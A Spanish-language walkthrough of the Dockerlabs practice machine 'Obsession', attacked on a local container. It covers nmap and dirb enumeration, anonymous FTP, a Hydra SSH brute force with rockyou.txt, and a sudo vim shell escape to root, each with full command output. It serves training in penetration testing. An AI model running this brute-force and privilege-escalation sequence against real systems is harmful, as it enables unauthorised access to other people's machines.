# Write-up Obsesion
> Maquina de Dockerlabs https://dockerlabs.es/

> Maquina de Juan-Fecha de creación: 25/06/2024

> Fecha de creación del Write-up 20/02/2025

> ⚠️ TODO LO QUE SE REALIZA EN ESTE DOCUMENTO ES CON FINES EDUCATIVOS, NO ME HAGO RESPONSABLE DEL USO INDEBIDO DE ESTA INFORMACIÓN.⚠️ 



## Índice
1. [Descripción](#Descripción)
2. [Herramientas](#Herramaientas)
3. [Instalación](#Instalación)
4. [Proceso_de_explotación](#Proceso_de_explotación)

## Descripción

Durante todo el proceso del **Write-up** se demostrará con las diferentes herramientas cómo se puede llegar a entrar al modo **root** y poder dar por acabada la prueba de intrusión.

## Herramientas

| Herramientas     | Descripción                       | Versión    |
|------------------|-----------------------------------|-----------|
|**Nmap**| Permite descubrir dispositivos en la red, servicios, puertos...           | 7.94SVN  |
| **Dirb**   | Permite, a través de diferentes componentes de la herramienta, buscar exploits para poder aprovecharse de las vulnerabilidades que existan.     | v2.22|
| **Ftp**| Protocolo que permite conectarse al servicio de archivos de la máquina.      | 20230507-2+|
| **ssh**   | Protocolo que permite conectarse por remoto a otraa máquina.      | OpenSSH_9.9p1 Debian-3, OpenSSL 3.3.2 3 Sep 2024|
| **Hydra**   | Herramienta que permite hacer pruebas de fuerza bruta indicando los diccionarios de prueba     | v9.5 (c) 2023|

## Instalación

Antes de empezar, deberemos desplegar la máquina vulnerable para que esté disponible durante todo el proceso de intrusión.
```bash

'Le damos permisos de ejecución.'

└─$ sudo chmod +x auto_deploy.sh 
[sudo] contraseña para alema: 
                                                                             
┌──(alema㉿alema)-[~/Escritorio/dockerlabs/Muy_facil/obsession]
└─$ sudo bash auto_deploy.sh obsession.tar 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla


```
## Proceso_de_explotación

Ahora que la máquina ya está disponible, pasaremos a comprobar qué servicios y puertos tiene abiertos a la red.

```bash
'Deberemos de utilizar la herramienta Nmap con el parámetro -A para que compruebe puertos, servicios, scripts...'

┌──(alema㉿alema)-[~/Escritorio/dockerlabs/Muy_facil/obsession]
└─$ sudo nmap -A 172.17.0.2 
[sudo] contraseña para alema: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 12:25 CET
Nmap scan report for 172.17.0.2
Host is up (0.000077s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Russoski Coaching
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.08 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds


```

Tras hacer el escaneo, se puede observar que la máquina  tiene el servicio de FTP con la versión de vsftpd 3.0.5. Dentro de este, se puede ver que hay dos txt accesibles por el usuario Anonymous.

```bash

'Nos conectaremos al servicio con el usuario Anonymous.'

                                                                                                              
┌──(kali㉿kali)-[~]
└─$ ftp 172.17.0.2                                                                  
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
'Comprobamos los archivos disponibles.'
ftp> ls
229 Entering Extended Passive Mode (|||10120|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
226 Directory send OK.
'Descargamos los archivos disponibles.'
ftp> mget *.txt
mget chat-gonza.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||27876|)
150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).
100% |***********************************************************************************************************************************************************************************************|   667      227.90 KiB/s    00:00 ETA
226 Transfer complete.
667 bytes received in 00:00 (84.86 KiB/s)
mget pendientes.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||13375|)
150 Opening BINARY mode data connection for pendientes.txt (315 bytes).
100% |***********************************************************************************************************************************************************************************************|   315      271.26 KiB/s    00:00 ETA
226 Transfer complete.
315 bytes received in 00:00 (157.10 KiB/s)
ftp> exit
221 Goodbye.

````
Comprobamos el contenido de los archivos.                                                                                                                                                                                                                                           
```bash

┌──(kali㉿kali)-[~]
└─$ cat chat-gonza.txt
[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
[21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ cat pendientes.txt 
1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!

2 Aumentar el precio de mis asesorías online en la Web!

3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!

4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros...

```
Al comprobar el contenido de los ficheros de la víctima, podemos saber que tiene un archivo comprometedor y también que tiene algunos permisos elevados.


Para continuar con la investigación, vamos a revisar los servicios que corren por el puerto 80. Si nos conectamos, podemos ver la siguiente página web.

![image](https://github.com/user-attachments/assets/e70bc3fc-cb0b-4303-a204-c1bd9e22fe4e)


Ahora que hemos visto la página web, lo que deberíamos hacer es utilizar la herramienta dirb para poder listar todo el contenido que tenga, ya sea subdirectorios, documentos públicos o alguna vulnerabilidad.

```bash  
┌──(kali㉿kali)-[~]
└─$ dirb http://172.17.0.2   


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Feb 13 16:04:59 2025
URL_BASE: http://172.17.0.2/

'Este es el diccionario que se utilizará.'

WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.17.0.2/ ----
==> DIRECTORY: http://172.17.0.2/backup/                                                                                                                                                                                                   
==> DIRECTORY: http://172.17.0.2/important/                                                                                                                                                                                                
+ http://172.17.0.2/index.html (CODE:200|SIZE:5208)                                                                                                                                                                                        
+ http://172.17.0.2/server-status (CODE:403|SIZE:275)                                                                                                                                                                                      
                                                                                                                                                                                                                      
---- Entering directory: http://172.17.0.2/backup/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                           
---- Entering directory: http://172.17.0.2/important/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Feb 13 16:05:01 2025
DOWNLOADED: 4612 - FOUND: 2

```
Si revisamos el contenido del comando dirb podemos ver que nos ha listado dos directorios,"backup" y "important". Al determinar el contenido como indica la herramienta, podemos ver lo siguiente:

En el directorio "http://172.17.0.2/important/" 

Como se observa, hay un .md  del cual no hay nada destacable de momento.



![image](https://github.com/user-attachments/assets/a2049884-9de6-4536-9064-897f728c7630)


En el directorio "http://172.17.0.2/backup/" 

Aqui dentro hay un txt que indica el usuario por defecto que utiliza la víctima para los servicios.

![image](https://github.com/user-attachments/assets/cdd32666-5577-4f0c-b27a-c80b0864a101)

Si volvemos a revisar el nmap, podemos ver que tiene un servicio de SSH, así que probaremos este usuario con la herramienta Hydra.

```bash  
'Utilizamos el parámetro -vV para poder ver los resultados que prueba.'
┌──(alema㉿alema)-[~]
└─$ sudo hydra -l russoski  -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh  -vV

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-22 10:25:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://russoski@172.17.0.2:22
[INFO] Successful, password authentication is supported by ssh://172.17.0.2:22
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[VERBOSE] Disabled child 12 because of too many errors
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "654321" - 17 of 14344400 [child 0] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "michael" - 18 of 14344400 [child 2] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "ashley" - 19 of 14344400 [child 4] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "qwerty" - 20 of 14344400 [child 1] (0/1)
[ERROR] ssh protocol error
****************************************TIEMPO DESPUÉS******************************************
[VERBOSE] Retrying connection for child 2
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "987654321" - 82 of 14344400 [child 6] (0/1)
[RE-ATTEMPT] target 172.17.0.2 - login "russoski" - pass "lovers" - 82 of 14344400 [child 2] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "computer" - 83 of 14344400 [child 7] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "whatever" - 84 of 14344400 [child 0] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "dragon" - 85 of 14344400 [child 1] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "vanessa" - 86 of 14344400 [child 10] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "cookie" - 87 of 14344400 [child 4] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "naruto" - 88 of 14344400 [child 5] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "summer" - 89 of 14344400 [child 8] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "sweety" - 90 of 14344400 [child 9] (0/1)
[VERBOSE] Retrying connection for child 13
[RE-ATTEMPT] target 172.17.0.2 - login "russoski" - pass "junior" - 101 of 14344400 [child 3] (0/1)
[VERBOSE] Retrying connection for child 14
[RE-ATTEMPT] target 172.17.0.2 - login "russoski" - pass "taylor" - 101 of 14344400 [child 13] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "alexis" - 102 of 14344400 [child 1] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "jesus" - 103 of 14344400 [child 7] (0/1)
[RE-ATTEMPT] target 172.17.0.2 - login "russoski" - pass "yellow" - 103 of 14344400 [child 14] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "estrella" - 104 of 14344400 [child 10] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "miguel" - 105 of 14344400 [child 15] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "william" - 106 of 14344400 [child 4] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "thomas" - 107 of 14344400 [child 8] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "beautiful" - 108 of 14344400 [child 0] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "mylove" - 109 of 14344400 [child 6] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "angela" - 110 of 14344400 [child 2] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "poohbear" - 111 of 14344400 [child 9] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "patrick" - 112 of 14344400 [child 5] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "iloveme" - 113 of 14344400 [child 1] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "sakura" - 114 of 14344400 [child 7] (0/1)
[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "adrian" - 115 of 14344400 [child 10] (0/1)
'Despues de un tiempo podemos ver que ha encontrado la contraseña del usuario'
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme`

[STATUS] attack finished for 172.17.0.2 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-22 10:26:07
                                                                                     
```
Ahora que sabemos la contraseña, entraremos por el servicio SSH.

```bash  
┌──(alema㉿alema)-[~]
└─$ ssh russoski@172.17.0.2                                                        
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:R8ZiOJN33rhfvGADBLwVQ1mPV7lSmGJACOhjdTB0wMQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
russoski@172.17.0.2's password:
'Ponemos la contraseña que hemos descubierto.'
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.2-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1

'Comprobamos el usuario.'

russoski@f97682611d3e:~$ whoami
russoski

'Listamos el contenido del usuario.'

russoski@f97682611d3e:~$ ls
Documentos  Proyectos
russoski@f97682611d3e:~$ cd Proyectos/
russoski@f97682611d3e:~/Proyectos$ ls
README.md  Strong-Credentials.py
russoski@f97682611d3e:~/Proyectos$ cd Documentos
-bash: cd: Documentos: No such file or directory
russoski@f97682611d3e:~/Proyectos$ cd ..
russoski@f97682611d3e:~$ cd Documentos/

'Podemos ver la fotografía que hablaba el usuario en el txt del servicio FTP.'

russoski@f97682611d3e:~/Documentos$ ls
'Nikola Tesla.jpg'
russoski@f97682611d3e:~/Documentos$ 

                                                                                     
```
Si queremos ver la imagen que hablaba al principio el usuario, podríamos descargarla y así comprobar si es posible la transferencia.

```bash  
┌──(alema㉿alema)-[~]
└─$ sudo scp russoski@172.17.0.2:/home/russoski/Documentos/"Nikola Tesla.jpg" /home/alema 
[sudo] contraseña para alema: 
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:R8ZiOJN33rhfvGADBLwVQ1mPV7lSmGJACOhjdTB0wMQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
russoski@172.17.0.2's password: 
Nikola Tesla.jpg                                                                                                                                                                                         100%  140KB  10.7MB/s   00:00    
                   
                                                                                     
```
La imagen "comprometida" es la siguiente:

![image](https://github.com/user-attachments/assets/f30d37cb-ca68-41c2-abcd-93beec30b5a2)




Ahora para continuar, deberemos ver los permisos que tiene el usuario y si es posible elevar privilegios.

```bash

'Con el siguiente comando podemos ver si el usuario en el que estamos, tiene algún tipo de permiso.'

russoski@f97682611d3e:~/Documentos$ sudo -l
Matching Defaults entries for russoski on f97682611d3e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on f97682611d3e:
    (root) NOPASSWD: /usr/bin/vim
russoski@f97682611d3e:~/Documentos$ 

```

Si nos fijamos en el resultado, podemos ver que tiene permisos con la herramienta vim. Tras saber esto, podemos consultar en la pagína GTFObins para ver qué tipo  de vulnerabilidades existen para poder elevar permisos.


![image](https://github.com/user-attachments/assets/16557a55-297a-45ff-9d57-b2bbe93fbf67)


En este apartado, deberemos entrar en el apartado de "sudo" y comprobar qué podemos hacer. Si leemos los diferentes apartados, podemos ver que hay un comando para ingresar a una shell interactiva dentro de vim.

![image](https://github.com/user-attachments/assets/407b58fd-0333-41f5-9c78-84eb574b268a)

Si utilizamos esto dentro del SSH, podremos ver que sí que podemos entrar como root.

```bash  
russoski@f97682611d3e:~/Documentos$ sudo vim -c ':!/bin/sh'

# whoami
root


```

Con esto se da por acabado la intrusión a la máquina obsession.








